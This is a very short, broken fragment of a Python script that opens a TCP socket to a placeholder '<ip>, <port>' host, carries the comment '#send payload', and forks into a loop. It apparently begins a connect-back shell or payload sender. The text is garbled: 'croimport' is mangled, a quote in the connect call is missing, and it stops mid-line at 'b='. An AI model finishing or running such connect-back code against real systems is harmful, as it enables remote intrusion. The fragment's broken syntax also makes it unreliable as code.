#!/usr/bin/python

croimport os
from socket import *
import sys

s=socket(AF_INET, SOCK_STREAM)
s.connect(('<ip>, <port>))
#send payload
if os.fork():
	while 1:
		b=
